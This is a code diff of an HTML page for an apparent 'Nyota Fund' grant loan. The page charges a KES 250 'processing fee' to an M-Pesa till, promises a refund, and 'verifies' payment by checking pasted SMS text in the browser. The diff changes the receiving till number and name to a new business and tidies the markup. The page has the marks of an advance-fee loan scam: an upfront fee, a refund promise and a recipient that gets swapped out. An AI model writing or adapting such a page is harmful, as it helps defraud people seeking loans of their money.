@@ -14,7 +14,9 @@
   <div class="popup-card">
     <h3 style="margin:0; color:#b30000;">Verification Failed</h3>
     <p id="errorText" style="margin:10px 0; font-size:15px;"></p>
-    <button id="errorCloseBtn" class="btn-cta" style="background:#b30000;">Close</button>
+    <button id="errorCloseBtn" class="btn-cta" style="background:#b30000;">
+      Close
+    </button>
   </div>
 </div>
 
@@ -38,15 +40,18 @@
 
     <!-- REFUND NOTE -->
     <p class="small" style="margin-top:6px;color:#0a7f2e">
-      The processing fee is <strong>100% refundable</strong> if your financial eligibility is not approved.
-      Refunds are returned to the same M-Pesa number within 24–48 hours.
+      The processing fee is <strong>100% refundable</strong> if your financial
+      eligibility is not approved. Refunds are returned to the same M-Pesa
+      number within <strong>24–48 hours</strong>.
     </p>
 
     <form id="feeForm" style="margin-top:16px">
       <label>Your Grant Loan Amount (KES)</label>
       <input name="amount" class="input" type="number" required min="1000" max="50000">
 
-      <button class="btn-cta" style="margin-top:12px">Show Processing Fee</button>
+      <button class="btn-cta" style="margin-top:12px">
+        Show Processing Fee
+      </button>
 
       <div id="feeOutput" class="small" style="margin-top:16px"></div>
 
@@ -56,7 +61,7 @@
           id="mpesaMessage"
           class="input"
           rows="4"
-          placeholder="e.g. TLE6713P9N Confirmed. Ksh250.00 paid to KIMTECH VENTURES..."
+          placeholder="e.g. TLADS0NHSC Confirmed. Ksh250.00 paid to COLETS SOLUTIONS..."
         ></textarea>
 
         <button id="nextBtn" class="btn-cta" style="margin-top:12px;" disabled>
@@ -68,15 +73,18 @@
 </main>
 
 <footer>
-  <div class="container small">© Nyota Fund <span id="year-fee"></span></div>
+  <div class="container small">
+    © Nyota Fund <span id="year-fee"></span>
+  </div>
 </footer>
 
 <script>
-document.getElementById("year-fee").textContent = new Date().getFullYear();
+document.getElementById("year-fee").textContent =
+  new Date().getFullYear();
 
 /* ================= CONFIG ================= */
-const TILL_NUMBER = "7177038";
-const TILL_NAME = "KIMTECH VENTURES";
+const TILL_NUMBER = "5628178";        // your till number
+const TILL_NAME = "COLETS SOLUTIONS"; // UPDATED TILL NAME
 const REQUIRED_FEE = 250;
 
 /* ================= POPUP ================= */
@@ -107,7 +115,9 @@ document.getElementById("feeForm").addEventListener("submit", (e) => {
   document.getElementById("feeOutput").innerHTML = `
     <strong>Loan Amount:</strong> KES ${amount.toLocaleString()}<br>
     <strong>Processing Fee:</strong>
-    <span style="color:#0A84FF; font-weight:bold;">KES ${REQUIRED_FEE}</span><br><br>
+    <span style="color:#0A84FF; font-weight:bold;">
+      KES ${REQUIRED_FEE}
+    </span><br><br>
 
     <div style="background:#f2f6ff;padding:14px;border-radius:10px;text-align:center">
       <div style="font-size:13px;opacity:.7">TILL NUMBER</div>
@@ -118,24 +128,9 @@ document.getElementById("feeForm").addEventListener("submit", (e) => {
         style="margin-top:10px;padding:8px 16px;font-size:14px">
         Copy Till Number
       </button>
-      <div style="margin-top:8px"><strong>${TILL_NAME}</strong></div>
-    </div>
-
-    <div style="
-      margin-top:14px;
-      background:#e8fff1;
-      border-left:4px solid #00a03d;
-      padding:12px;
-      border-radius:8px;
-      font-size:14px;
-      line-height:1.5;
-    ">
-      <strong>Policy:</strong><br>
-      The processing fee is <strong>fully refundable</strong> if your application
-      does not pass final financial eligibility verification.
-      <br><br>
-      Refunds are processed automatically to the same M-Pesa number within
-      <strong>24–48 hours</strong>.
+      <div style="margin-top:8px">
+        <strong>${TILL_NAME}</strong>
+      </div>
     </div>
   `;
 
@@ -152,14 +147,18 @@ document.getElementById("mpesaMessage").addEventListener("input", () => {
 document.getElementById("nextBtn").addEventListener("click", (e) => {
   e.preventDefault();
 
-  const msg = document.getElementById("mpesaMessage").value.trim().toUpperCase();
+  const msg = document.getElementById("mpesaMessage")
+    .value
+    .trim()
+    .toUpperCase()
+    .replace(/\s+/g, " ");
 
   if (!msg.includes("CONFIRMED")) {
-    showErrorPopup("M-Pesa message must contain 'Confirmed'.");
+    showErrorPopup("M-Pesa message must contain the word 'Confirmed'.");
     return;
   }
 
-  if (!msg.includes(TILL_NAME)) {
+  if (!msg.includes(TILL_NAME.toUpperCase())) {
     showErrorPopup("Till name does not match: " + TILL_NAME);
     return;
   }
